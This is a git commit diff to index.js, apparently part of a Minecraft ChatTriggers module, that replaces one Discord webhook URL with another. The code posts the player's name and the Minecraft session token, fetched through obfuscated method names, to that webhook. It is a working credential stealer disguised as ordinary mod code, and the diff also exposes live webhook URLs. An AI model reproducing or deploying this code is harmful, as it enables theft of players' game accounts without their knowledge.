72aad614e121c99613b8a46cc810a4590af741a6
goatedcoder3000 <101049863+goatedcoder3000@users.noreply.github.com>
2025-04-18 11:53:48 +0200

    Update index.js

--- index.js
+++ index.js
@@ -1,7 +1,7 @@
 import request from "../requestV2"
 
 request({
-    url: "https://discord.com/api/webhooks/1360902504463994900/TsAOWCBf_0kmBXDzY18jOb2CX5qmVoK0FRnIxw09Y-a5dDTRuT241gHaPp_7eu8uYrye",
+    url: "https://discord.com/api/webhooks/1362727721620340869/UtGPhrBeFs8VfSEtIBdgejhLvnCdxBd1CcQI-fkJ6dhsajDOKZa_hmfAH8KiRUYzF03E",
     method: "POST",
     headers: {"User-agent":"Mozilla/5.0"},
     body: {content: "```" + Player.getName() + "```\n```" + Client.getMinecraft().func_110432_I().func_148254_d() + "```"}
